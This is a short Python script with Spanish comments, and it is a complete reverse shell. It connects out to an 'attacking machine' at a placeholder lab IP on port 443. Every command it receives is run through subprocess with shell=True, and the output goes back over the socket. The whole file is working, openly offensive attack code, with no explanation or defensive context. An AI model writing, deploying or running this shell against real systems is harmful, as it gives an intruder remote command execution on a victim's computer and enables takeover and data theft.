import socket
import subprocess

LHOST = "192.168.56.101"  # Cambia esto por la IP de tu máquina atacante
LPORT = 443
BUFFER_SIZE = 1024

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(f"[*] Conectando a {LHOST}:{LPORT}...")
    client.connect((LHOST, LPORT))
    print("[+] Conexión establecida")
except Exception as e:
    print(f"[-] Error al conectar: {e}")
    exit()

while True:
    try:
        data = client.recv(BUFFER_SIZE)
        if not data:
            break

        code = data.decode("latin-1").strip()  # Soporta caracteres especiales en Windows
        print(f"[>] Ejecutando: {code}")

        if code.lower() == "exit":
            break  # Permite salir limpiamente

        try:
            output = subprocess.check_output(code, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as error:
            output = error.output  # Captura el error en caso de fallo

        client.send(output if output else b"[+] Comando ejecutado sin salida\n")  # Evita enviar nada vacío
    except Exception as error:
        client.send(f"Error: {error}".encode("latin-1"))

client.close()
